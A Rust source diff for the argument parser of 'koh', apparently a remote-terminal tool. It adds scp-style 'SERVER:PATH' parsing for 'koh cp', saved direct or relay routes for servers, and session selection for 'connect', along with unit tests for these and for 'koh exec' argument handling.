@@ -481,6 +918,105 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
         None => Ok(Cmd::Menu),
         Some(_) => Err(missing("subcommand")),
     }
+}
+
+/// The route `koh servers add` was given, if any: `koh clients add` takes none.
+fn saved_route(m: &ArgMatches) -> Option<Route> {
+    let direct = m.try_get_one::<SocketAddr>("direct").ok().flatten();
+    let relay = || m.try_get_one::<RelayUrl>("relay_url").ok().flatten();
+    direct
+        .copied()
+        .map(Route::Direct)
+        .or_else(|| relay().cloned().map(Route::Relay))
+}
+
+/// The server and how to dial it, as `m` says.
+fn remote_args(m: &ArgMatches) -> Result<RemoteArgs, clap::Error> {
+    Ok(RemoteArgs {
+        server: m
+            .get_one::<ServerRef>("server")
+            .cloned()
+            .ok_or_else(|| missing("server"))?,
+        key_file: m.get_one::<PathBuf>("key_file").cloned(),
+        direct: m.get_one::<SocketAddr>("direct").copied(),
+        relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
+    })
+}
+
+/// A path `koh cp` was given: here, or on a server.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum Location {
+    Local(PathBuf),
+    Remote(ServerRef, RemotePath),
+}
+
+impl Location {
+    /// `arg` as scp reads it: `SERVER:PATH` if there is a `:` with no `/` before it and what is
+    /// before it names a server; else a local path.
+    fn of(arg: &OsString) -> Result<Self, clap::Error> {
+        let bytes = arg.as_bytes();
+        let split = bytes.iter().position(|&b| b == b':').and_then(|at| {
+            let (server, path) = (bytes.get(..at)?, bytes.get(at.saturating_add(1)..)?);
+            let server = std::str::from_utf8(server)
+                .ok()
+                .filter(|s| !s.is_empty() && !s.contains('/'))?;
+            Some((server_ref(server).ok()?, path))
+        });
+        match split {
+            Some((server, path)) => RemotePath::new(path.to_vec())
+                .map(|path| Self::Remote(server, path))
+                .map_err(|why| invalid(&format!("{}: {why}", arg.to_string_lossy()))),
+            None => Ok(Self::Local(PathBuf::from(arg))),
+        }
+    }
+}
+
+/// The copy `paths` (the sources, then the destination) ask for, and its server: exactly one side
+/// is the server's.
+fn copy_job(paths: &[&OsString]) -> Result<(ServerRef, CopyJob), clap::Error> {
+    let mut locations = paths
+        .iter()
+        .map(|arg| Location::of(arg))
+        .collect::<Result<Vec<_>, _>>()?;
+    let Some(dest) = locations.pop() else {
+        return Err(missing("destination"));
+    };
+    let one_side =
+        || invalid("copy between this machine and one server: every SRC is SERVER:PATH, or DST is");
+    match dest {
+        Location::Remote(server, dest) => {
+            let sources = locations
+                .into_iter()
+                .map(|source| match source {
+                    Location::Local(path) => Ok(path),
+                    Location::Remote(..) => Err(one_side()),
+                })
+                .collect::<Result<Vec<_>, _>>()?;
+            Ok((server, CopyJob::Put { sources, dest }))
+        }
+        Location::Local(dest) => {
+            let mut server = None;
+            let mut sources = Vec::with_capacity(locations.len());
+            for source in locations {
+                let Location::Remote(from, path) = source else {
+                    return Err(one_side());
+                };
+                if server.get_or_insert_with(|| from.clone()) != &from {
+                    return Err(invalid("copy from one server at a time"));
+                }
+                sources.push(path);
+            }
+            let server = server.ok_or_else(one_side)?;
+            let sources =
+                Sources::new(sources).map_err(|why| invalid(&format!("the sources: {why}")))?;
+            Ok((server, CopyJob::Get { sources, dest }))
+        }
+    }
+}
+
+/// A usage error koh found in what clap took.
+fn invalid(why: &str) -> clap::Error {
+    clap::Error::raw(ErrorKind::ValueValidation, format!("{why}\n"))
 }
 
 /// A `--key-file` global to `m`: clap stores it with the subcommand given, `sub`.
@@ -541,12 +1077,17 @@ mod tests {
         assert_eq!(c.allow, [ID.parse().unwrap()]);
         // Everything not given on the command line must equal `ServeConfig::default()`.
         let d = ServeConfig::default();
-        assert_eq!(c.scrollback, d.scrollback);
+        assert_eq!(c.scrollback_bytes, d.scrollback_bytes);
         assert_eq!(c.session_ttl_secs, d.session_ttl_secs);
         assert_eq!(c.max_connections, d.max_connections);
         assert_eq!(c.max_sessions, d.max_sessions);
         assert!(!c.local && c.relay_url.is_none() && c.key_file.is_none());
         assert_eq!(c.port, d.port);
+        assert!(c.shell_marks && d.shell_marks);
+        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--no-shell-marks"]) else {
+            panic!("serve");
+        };
+        assert!(!c.shell_marks);
 
         // A single `--shell` is just the program.
         let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--shell", "/bin/zsh"]) else {
@@ -580,6 +1121,7 @@ mod tests {
     /// are on unless turned off, as in `ConnectConfig`'s default.
     #[test]
     fn connect_takes_a_server_a_bell_command_and_turns_features_off() {
+        use koh::request::{Pick, SessionNum};
         let connect = |argv: &[&str]| {
             let Cmd::Connect(c) = parsed(&[&["koh", "connect"][..], argv].concat()) else {
                 panic!("connect {argv:?}");
@@ -587,13 +1129,22 @@ mod tests {
             c
         };
         let c = connect(&[ID, "--on-bell", "termux-notification"]);
-        assert_eq!(c.server, super::ServerRef::Id(ID.parse().unwrap()));
+        assert_eq!(c.remote.server, super::ServerRef::Id(ID.parse().unwrap()));
         assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
-        assert!(c.clipboard && c.hyperlinks && c.colours && c.direct.is_none());
+        assert!(c.clipboard && c.hyperlinks && c.colours && c.remote.direct.is_none());
+        assert_eq!(c.pick, Pick::Latest);
         let d = koh::client::ConnectConfig::new(ID.parse().unwrap());
         assert!(d.clipboard && d.hyperlinks && d.colours && d.bell_command.is_none());
         let c = connect(&["laptop"]);
-        assert_eq!(c.server, super::ServerRef::Name("laptop".to_owned()));
+        assert_eq!(c.remote.server, super::ServerRef::Name("laptop".to_owned()));
+        assert_eq!(connect(&["laptop", "--new"]).pick, Pick::New);
+        assert_eq!(
+            connect(&["laptop", "--session", "4"]).pick,
+            Pick::Id(SessionNum(4))
+        );
+        assert!(command()
+            .try_get_matches_from(["koh", "connect", "laptop", "--new", "--session", "4"])
+            .is_err());
         for (flag, on) in [
             ("--no-clipboard", [false, true, true]),
             ("--no-hyperlinks", [true, false, true]),
@@ -675,10 +1226,52 @@ mod tests {
             op,
             Op::Add {
                 name: "phone".to_owned(),
-                id: ID.parse().unwrap()
+                id: ID.parse().unwrap(),
+                route: None,
+                scope: koh::names::Scope::default(),
             }
         );
         assert_eq!(key_file.as_deref(), Some(std::path::Path::new("/k")));
+        // A server is saved with how to dial it; a client, never dialed, has no such flag.
+        let Cmd::Names { op, .. } = parsed(&[
+            "koh",
+            "servers",
+            "add",
+            "box",
+            ID,
+            "--direct",
+            "10.0.0.2:4433",
+        ]) else {
+            panic!("servers add --direct");
+        };
+        assert!(
+            matches!(op, Op::Add { route: Some(koh::names::Route::Direct(addr)), .. } if addr.port() == 4433),
+            "{op:?}"
+        );
+        for argv in [
+            &[
+                "koh",
+                "clients",
+                "add",
+                "phone",
+                ID,
+                "--direct",
+                "10.0.0.2:4433",
+            ][..],
+            &[
+                "koh",
+                "servers",
+                "add",
+                "box",
+                ID,
+                "--direct",
+                "10.0.0.2:4433",
+                "--relay-url",
+                "https://relay.example",
+            ],
+        ] {
+            assert!(command().try_get_matches_from(argv).is_err(), "{argv:?}");
+        }
         let Cmd::Names { op, .. } = parsed(&["koh", "servers", "rename", "a", "b"]) else {
             panic!("servers rename");
         };
@@ -710,6 +1303,98 @@ mod tests {
                 .is_err(),
             "a named key and a key file at once"
         );
+    }
+
+    /// `koh exec` takes its program and arguments after `--`, each word as it is (a line for the
+    /// shell only with `--sh`); `koh cp` reads `SERVER:PATH` as scp does, one side the server's.
+    #[test]
+    fn exec_and_cp_read_their_arguments() {
+        use koh::client::CopyJob;
+        use koh::request::Command as Remote;
+        use std::path::PathBuf;
+        let Cmd::Exec { remote, run, json } = parsed(&[
+            "koh",
+            "exec",
+            "laptop",
+            "--direct",
+            "127.0.0.1:9",
+            "-C",
+            "src",
+            "--",
+            "ls",
+            "-la",
+            "a b",
+        ]) else {
+            panic!("exec");
+        };
+        let Remote::Argv(argv) = &run.command else {
+            panic!("argv");
+        };
+        assert_eq!(argv.words(), [&b"ls"[..], b"-la", b"a b"]);
+        assert_eq!(
+            run.cwd.as_ref().map(koh::request::RemotePath::as_bytes),
+            Some(&b"src"[..])
+        );
+        assert!(remote.direct.is_some() && !json);
+        let Cmd::Exec { run, json, .. } =
+            parsed(&["koh", "exec", ID, "--json", "--sh", "make && make test"])
+        else {
+            panic!("exec --sh");
+        };
+        let Remote::Shell(line) = &run.command else {
+            panic!("shell");
+        };
+        assert_eq!(line.as_bytes(), b"make && make test");
+        assert!(json && run.cwd.is_none());
+        // A command, and only one: words or a line.
+        for argv in [
+            &["koh", "exec", ID][..],
+            &["koh", "exec", ID, "--sh", "ls", "--", "ls"],
+        ] {
+            assert!(command().try_get_matches_from(argv).is_err(), "{argv:?}");
+        }
+        let copy = |argv: &[&str]| {
+            let Cmd::Copy {
+                remote, job, opts, ..
+            } = parsed(&[&["koh", "cp"][..], argv].concat())
+            else {
+                panic!("cp {argv:?}");
+            };
+            (remote.server, job, opts)
+        };
+        let (server, job, opts) = copy(&["-r", "-p", "--delete", "a", "./b:c", "laptop:~/x"]);
+        assert!(opts.keep_times && opts.delete && !opts.atomic);
+        assert_eq!(server, super::ServerRef::Name("laptop".to_owned()));
+        let CopyJob::Put { sources, dest } = job else {
+            panic!("put");
+        };
+        assert_eq!(sources, [PathBuf::from("a"), PathBuf::from("./b:c")]);
+        assert_eq!(dest.as_bytes(), b"~/x");
+        let (_, job, opts) = copy(&[&format!("{ID}:/etc/hosts"), &format!("{ID}:"), "."]);
+        assert!(!opts.keep_times && !opts.delete);
+        let CopyJob::Get { sources, dest } = job else {
+            panic!("get");
+        };
+        let paths: Vec<&[u8]> = sources
+            .paths()
+            .iter()
+            .map(koh::request::RemotePath::as_bytes)
+            .collect();
+        assert_eq!(paths, [&b"/etc/hosts"[..], b""]);
+        assert_eq!(dest, PathBuf::from("."));
+        // Both sides here, both there, or two servers: refused.
+        for argv in [
+            &["koh", "cp", "a", "b"][..],
+            &["koh", "cp", "laptop:a", "laptop:b"],
+            &["koh", "cp", "laptop:a", "phone:b"],
+            &["koh", "cp", "phone:a", "laptop:b", "here"],
+        ] {
+            let error = command()
+                .try_get_matches_from(argv)
+                .map_err(|e| e.kind())
+                .and_then(|m| parse(&m).map_err(|e| e.kind()));
+            assert!(error.is_err(), "{argv:?}");
+        }
     }
 
     #[test]
